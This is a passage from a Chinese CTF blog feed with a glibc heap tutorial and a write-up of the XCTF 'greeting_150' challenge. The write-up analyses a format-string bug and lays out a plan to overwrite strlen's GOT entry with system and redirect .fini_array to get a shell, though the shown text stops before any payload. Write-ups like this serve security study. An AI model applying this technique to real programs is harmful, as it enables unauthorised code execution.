number">0008</span>│      <span class="token number">0x7fffffffde98</span> —▸ <span class="token number">0x602010</span> ◂— <span class="token number">0x0</span><span class="token number">02</span><span class="token operator">:</span><span class="token number">0010</span>│ rbp  <span class="token number">0x7fffffffdea0</span> —▸ <span class="token function">0x400600</span> <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> ◂— push   r15<span class="token number">03</span><span class="token operator">:</span><span class="token number">0018</span>│      <span class="token number">0x7fffffffdea8</span> —▸ <span class="token function">0x7ffff7a2d840</span> <span class="token punctuation">(</span>__libc_start_main<span class="token operator">+</span><span class="token number">240</span><span class="token punctuation">)</span> ◂— mov    edi<span class="token punctuation">,</span> eax<span class="token number">04</span><span class="token operator">:</span><span class="token number">0020</span>│      <span class="token number">0x7fffffffdeb0</span> ◂— <span class="token number">0x1</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">0028</span>│      <span class="token number">0x7fffffffdeb8</span> —▸ <span class="token number">0x7fffffffdf88</span> —▸ <span class="token number">0x7fffffffe2f0</span> ◂— <span class="token string">'/home/matrix/a.out'</span><span class="token number">06</span><span class="token operator">:</span><span class="token number">0030</span>│      <span class="token number">0x7fffffffdec0</span> ◂— <span class="token number">0x1f7ffcca0</span><span class="token number">07</span><span class="token operator">:</span><span class="token number">0038</span>│      <span class="token number">0x7fffffffdec8</span> —▸ <span class="token function">0x4005b6</span> <span class="token punctuation">(</span>main<span class="token punctuation">)</span> ◂— push   rbp────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────── ► f <span class="token number">0</span>           4005f3 main<span class="token operator">+</span><span class="token number">61</span>   f <span class="token number">1</span>     7ffff7a2d840 __libc_start_main<span class="token operator">+</span><span class="token number">240</span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token number">0x602010-</span><span class="token number">0x10</span><span class="token number">0x602000</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span><span class="token number">0x602010</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x000000000000000a</span>  <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span>前面的数据被清空了<span class="token number">0x602020</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x602030</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000020fd1</span><span class="token number">0x602040</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span></code></pre><p>free之后user_data的前8字节数据被清空，但是没有清空后面的\n 。这里咱们留一个伏笔~~，再输入AAAAAAAABBBBBBBB试一试：</p><pre class=" language-java"><code class="language-java">──────────────────────────────────────────────────────────────<span class="token punctuation">[</span> <span class="token function">SOURCE</span> <span class="token punctuation">(</span>CODE<span class="token punctuation">)</span> <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────In file<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>matrix<span class="token operator">/</span>test<span class="token punctuation">.</span>c    <span class="token number">4</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token number">5</span> <span class="token punctuation">{</span>    <span class="token number">6</span>     <span class="token keyword">void</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">7</span>     <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">8</span>     <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span> ►  <span class="token number">9</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token number">10</span> <span class="token punctuation">}</span>──────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────────<span class="token number">00</span><span class="token operator">:</span><span class="token number">0000</span>│ rsp  <span class="token number">0x7fffffffddb0</span> —▸ <span class="token number">0x7fffffffdea0</span> ◂— <span class="token number">0x1</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">0008</span>│      <span class="token number">0x7fffffffddb8</span> —▸ <span class="token number">0x602010</span> ◂— <span class="token number">0x0</span><span class="token number">02</span><span class="token operator">:</span><span class="token number">0010</span>│ rbp  <span class="token number">0x7fffffffddc0</span> —▸ <span class="token function">0x400600</span> <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> ◂— push   r15<span class="token number">03</span><span class="token operator">:</span><span class="token number">0018</span>│      <span class="token number">0x7fffffffddc8</span> —▸ <span class="token function">0x7ffff7a2d840</span> <span class="token punctuation">(</span>__libc_start_main<span class="token operator">+</span><span class="token number">240</span><span class="token punctuation">)</span> ◂— mov    edi<span class="token punctuation">,</span> eax<span class="token number">04</span><span class="token operator">:</span><span class="token number">0020</span>│      <span class="token number">0x7fffffffddd0</span> ◂— <span class="token number">0x1</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">0028</span>│      <span class="token number">0x7fffffffddd8</span> —▸ <span class="token number">0x7fffffffdea8</span> —▸ <span class="token number">0x7fffffffe24a</span> ◂— <span class="token string">'/home/matrix/a.out'</span><span class="token number">06</span><span class="token operator">:</span><span class="token number">0030</span>│      <span class="token number">0x7fffffffdde0</span> ◂— <span class="token number">0x1f7ffcca0</span><span class="token number">07</span><span class="token operator">:</span><span class="token number">0038</span>│      <span class="token number">0x7fffffffdde8</span> —▸ <span class="token function">0x4005b6</span> <span class="token punctuation">(</span>main<span class="token punctuation">)</span> ◂— push   rbp────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────── ► f <span class="token number">0</span>           4005f3 main<span class="token operator">+</span><span class="token number">61</span>   f <span class="token number">1</span>     7ffff7a2d840 __libc_start_main<span class="token operator">+</span><span class="token number">240</span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token number">0x602000</span><span class="token number">0x602000</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span><span class="token number">0x602010</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x4242424242424242</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token number">0x602020</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x602030</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000020fd1</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>top chunk<span class="token number">0x602040</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x602050</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span></code></pre><p>果然后面的8字节不会被置零！想要解开这个谜团就不得不提到上古神将豳嗣了（bins）~~</p><h3 id="上古神将：bins"><a href="#上古神将：bins" class="headerlink" title="上古神将：bins"></a>上古神将：bins</h3><p>传说当时的chunks界物资浪费严重，operating system被渐渐掏空，造物主为了制衡派遣bins神去帮chunks们学习垃圾分类…..<br>bins共有4位：fastbins unsortedbin smallbin largebins。如同俄罗斯套娃，这四位bin也有各自的小将</p><pre class=" language-java"><code class="language-java">fastbins：专门回收小型垃圾（free chunks） 默认就是这<span class="token number">7</span>位，在32Bytes pallar world<span class="token operator">--</span>operating system  他们的大小除以<span class="token number">2</span>即可<span class="token number">0x20</span><span class="token operator">:</span> <span class="token number">0x0</span><span class="token number">0x30</span><span class="token operator">:</span> <span class="token number">0x0</span><span class="token number">0x40</span><span class="token operator">:</span> <span class="token number">0x0</span><span class="token number">0x50</span><span class="token operator">:</span> <span class="token number">0x0</span><span class="token number">0x60</span><span class="token operator">:</span> <span class="token number">0x0</span><span class="token number">0x70</span><span class="token operator">:</span> <span class="token number">0x0</span><span class="token number">0x80</span><span class="token operator">:</span> <span class="token number">0x0</span></code></pre><p>unsortedbin ：大将一人，且听下回分解<br>smallbins：且听下回分解<br>largebins：且听下回分解</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>free后的chunks会依据自己的完整大小放入不同的bins中，相应的也会清除某些数据但并不会全部清除。谜团众多请听下回分解~~。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-greeting_150</title>
      <link href="/2020/09/03/xctf-challenge-greeting-150/"/>
      <url>/2020/09/03/xctf-challenge-greeting-150/</url>
      
        <content type="html"><![CDATA[<p>昨天好不容易装上pwndbg，总是因为最后./setup时报错，说python3.6找不到命令，在网上找了很多教程都没用，最后把了解到pwndbg相当于一个加强版的gdb，然后我就把gdb删了就顺利装上了😭<br>废话少说，回到题目~~</p><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ checksec greeting<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/greeting'</span>    Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    No RELRO    Stack<span class="token operator">:</span>    Canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span></code></pre><p>开启NX和Canary</p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-84h]</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+5Ch] [ebp-44h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+9Ch] [ebp-4h]</span>  v6 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please tell me your name... "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">getnline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Don't ignore me ;( "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token string">"Nice to meet you, %s :)\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">getline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>size_t __cdecl <span class="token function">getnline</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>    <span class="token operator">*</span>v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">nao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">int</span> <span class="token function">nao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo \"Hello, I'm nao\"!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>关键函数：</p><ul><li>getline就是DIY了一个读取函数，一直到换行符结束(0xa==10)读取，并最后将换行符换做截至符\x00</li><li>nao函数，明显是一个hint，调用system函数输出：Hello, I’m nao</li><li>最后printf存在fmt漏洞</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们来看看程序执行情况：</p><pre><code>hunter@hunter:~/PWN/XCTF/xctf_challenge$ ./greeting Hello, I&#39;m nao!Please tell me your name... AAAANice to meet you, AAAA :)</code></pre><p>结合IDA主函数分析，按理不应该出现：Hello, I’m nao! 在main函数中并没有调用nao函数的地方。</p><p>利用IDA查看交叉引用的功能：<br><img src="https://s1.ax1x.com/2020/09/03/wC6zs1.png" alt=""></p><p>继续进入查看：</p><pre class=" language-java"><code class="language-java">text<span class="token operator">:</span><span class="token number">08048708</span> loc_8048708<span class="token operator">:</span>                            <span class="token punctuation">;</span> CODE XREF<span class="token operator">:</span> __libc_csu_init<span class="token operator">+</span><span class="token number">57</span>↓j<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048708</span>                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token operator">+</span>arg_8<span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token operator">:</span>0804870C                 mov     <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token operator">+</span>var_2C<span class="token punctuation">]</span><span class="token punctuation">,</span> ebp<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0804870F</span>                 mov     <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token operator">+</span>var_24<span class="token punctuation">]</span><span class="token punctuation">,</span> eax<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048713</span>                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token operator">+</span>arg_4<span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048717</span>                 mov     <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token operator">+</span>var_28<span class="token punctuation">]</span><span class="token punctuation">,</span> eax<span class="token punctuation">.</span>text<span class="token operator">:</span>0804871B                 call    ds<span class="token operator">:</span><span class="token punctuation">(</span>__frame_dummy_init_array_entry <span class="token operator">-</span> 8049A28h<span class="token punctuation">)</span><span class="token punctuation">[</span>ebx<span class="token operator">+</span>edi<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">]</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">=</span>此处调用<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048722</span>                 add     edi<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048725</span>                 cmp     edi<span class="token punctuation">,</span> esi<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048727</span>                 jnz     <span class="token keyword">short</span> loc_8048708<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048729</span>继续进入：<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C __frame_dummy_init_array_entry dd offset frame_dummy<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                                         <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> LOAD<span class="token operator">:</span>0804809C↑o<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                                         <span class="token punctuation">;</span> __libc_csu_init<span class="token operator">+</span><span class="token number">23</span>↑o <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                                         <span class="token punctuation">;</span> Alternative name is <span class="token string">'__init_array_start'</span><span class="token punctuation">.</span>init_array<span class="token operator">:</span><span class="token number">08049930</span>                 dd offset nao<span class="token punctuation">.</span>init_array<span class="token operator">:</span><span class="token number">08049930</span> _init_array     ends</code></pre><p>也就是说nao函数先是由<strong>libc_csu_init执行到call    ds:(</strong>frame_dummy_init_array_entry - 8049A28h)[ebx+edi*4]，然后在此地址上存放了nao函数的偏移，由此进行调用。</p><h3 id="新姿势"><a href="#新姿势" class="headerlink" title="新姿势"></a>新姿势</h3><p>我们在用gdb调试的时候，执行完程序不难发现程序会ret到<strong>libc_start_main，所以main函数并不是程序真正开始的地方。程序会先进一些初始化函数如</strong>libc_start_main才会调用main函数。<br>然而在调用初始化函数之前会先调用_start，而_start就是程序真正的入口（Enter Point）</p><p>初始化函数<strong>libc_csu_init是比较常见的，就是在这里上面的程序调用nao函数。<br>那么有初始话函数也就会有对应的末“始”化函数：</strong>libc_csu_fini。他们就像俩兄弟一样，很像</p><p><strong>在程序中存在一种很神秘的段，其名为.init_array，此物存有函数指针，在进行<strong>libc_csu_init函数时，将会调用每一个指针。相似的，在程序中存在.fini_array段，也存放函数指针，在进行</strong>libc_csu_fini函数时便会调用每一个指针。这两处都是可写的 ，那么可以干坏事了（doge）</strong></p><p>这里存放的都是香喷喷的指针</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C <span class="token punctuation">;</span> ELF Initialization Function Table<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C <span class="token punctuation">;</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C <span class="token punctuation">;</span> Segment type<span class="token operator">:</span> Pure data<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C <span class="token punctuation">;</span> Segment permissions<span class="token operator">:</span> Read<span class="token operator">/</span>Write<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C _init_array     segment dword <span class="token keyword">public</span> <span class="token string">'DATA'</span> use32<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                 assume cs<span class="token operator">:</span>_init_array<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                 <span class="token punctuation">;</span>org 804992Ch<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C __frame_dummy_init_array_entry dd offset frame_dummy<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                                         <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> LOAD<span class="token operator">:</span>0804809C↑o<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                                         <span class="token punctuation">;</span> __libc_csu_init<span class="token operator">+</span><span class="token number">23</span>↑o <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                                         <span class="token punctuation">;</span> Alternative name is <span class="token string">'__init_array_start'</span><span class="token punctuation">.</span>init_array<span class="token operator">:</span><span class="token number">08049930</span>                 dd offset nao<span class="token punctuation">.</span>init_array<span class="token operator">:</span><span class="token number">08049930</span> _init_array     ends<span class="token punctuation">.</span>init_array<span class="token operator">:</span><span class="token number">08049930</span><span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> <span class="token punctuation">;</span> ELF Termination Function Table<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> <span class="token punctuation">;</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span><span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> <span class="token punctuation">;</span> Segment type<span class="token operator">:</span> Pure data<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> <span class="token punctuation">;</span> Segment permissions<span class="token operator">:</span> Read<span class="token operator">/</span>Write<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> _fini_array     segment dword <span class="token keyword">public</span> <span class="token string">'DATA'</span> use32<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span>                 assume cs<span class="token operator">:</span>_fini_array<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span>                 <span class="token punctuation">;</span>org 8049934h<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> __do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span>                                         <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> __libc_csu_init<span class="token operator">+</span><span class="token number">18</span>↑o<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> _fini_array     ends                    <span class="token punctuation">;</span> Alternative name is <span class="token string">'__init_array_end'</span><span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span></code></pre><h3 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h3><ul><li>存在fmt漏洞并且没有开启RELRO，可以对got表进行覆盖</li><li>有system函数，没有/bin/sh字符串，那么势必要进行两次输入，执行程序两次</li><li>fini_array可以覆盖，控制程序流程</li><li>payload最长46个字节</li></ul><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>构造payload将strlen的got表覆盖为system_plt</li><li>覆盖.fini_array的一处指针为start地址</li><li>读入/bin/sh直接获取shell</li></ul><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>因为payload长度有限制，所以不太适合用fmtstr_payload模块，必须自己精心构造<br>查看fini_array   0x08049934 处的指针：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> __do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux__do_global_dtors_aux：<span class="token punctuation">.</span>text<span class="token operator">:</span>080485A0 __do_global_dtors_aux proc near         <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> <span class="token punctuation">.</span>fini_array<span class="token operator">:</span>__do_global_dtors_aux_fini_array_entry↓o<span class="token punctuation">.</span>text<span class="token operator">:</span>080485A0                 cmp     ds<span class="token operator">:</span>completed_6591<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span>text<span class="token operator">:</span>080485A7                 jnz     <span class="token keyword">short</span> locret_80485BC<span class="token punctuation">.</span>text<span class="token operator">:</span>080485A9                 push    ebp<span class="token punctuation">.</span>text<span class="token operator">:</span>080485AA                 mov     ebp<span class="token punctuation">,</span> esp<span class="token punctuation">.</span>text<span class="token operator">:</span>080485AC                 sub     esp<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">.</span>text<span class="token operator">:</span>080485AF                 call    deregister_tm_clones<span class="token punctuation">.</span>text<span class="token operator">:</span>080485B4                 mov     ds<span class="token operator">:</span>completed_6591<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">.</span>text<span class="token operator">:</span>080485BB                 leave</code></pre><p>所以指针的值为080485A0 ,用gdb查看更为直观</p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> x<span class="token operator">/</span>10x <span class="token number">0x08049934</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>fini_array<span class="token number">0x8049934</span><span class="token operator">:</span>    <span class="token number">0x080485a0</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000001</span>    <span class="token number">0x00000001</span><span class="token number">0x8049944</span><span class="token operator">:</span>    <span class="token number">0x0000000c</span>    <span class="token number">0x08048404</span>    <span class="token number">0x0000000d</span>    <span class="token number">0x08048780</span><span class="token number">0x8049954</span><span class="token operator">:</span>    <span class="token number">0x00000019</span>    <span class="token number">0x0804992c</span>pwndbg<span class="token operator">></span> x<span class="token operator">/</span>10x <span class="token number">0x080485a0</span><span class="token number">0x80485a0</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x9aa43d80</span>    <span class="token number">0x75000804</span>    <span class="token number">0xe5895513</span>    <span class="token number">0xe808ec83</span><span class="token number">0x80485b0</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0xffffff7c</span>    <span class="token number">0x9aa405c6</span>    <span class="token number">0xc9010804</span>    <span class="token number">0x9066c3f3</span><span class="token number">0x80485c0</span> <span class="token operator">&lt;</span>frame_dummy<span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x049938a1</span>    <span class="token number">0x74c08508</span>pwndbg<span class="token operator">></span> x<span class="token operator">/</span>10i <span class="token number">0x080485a0</span>   <span class="token number">0x80485a0</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">></span><span class="token operator">:</span>    cmp    BYTE PTR ds<span class="token operator">:</span><span class="token number">0x8049aa4</span><span class="token punctuation">,</span><span class="token number">0x0</span>   <span class="token number">0x80485a7</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">7</span><span class="token operator">></span><span class="token operator">:</span>    jne    <span class="token number">0x80485bc</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">28</span><span class="token operator">></span>   <span class="token number">0x80485a9</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">9</span><span class="token operator">></span><span class="token operator">:</span>    push   ebp</code></pre><p>所以我们需要的地址如下：</p><pre class=" language-java"><code class="language-java">fini_array <span class="token operator">=</span> <span class="token number">0x08049934</span>  <span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">0x080485A0</span> 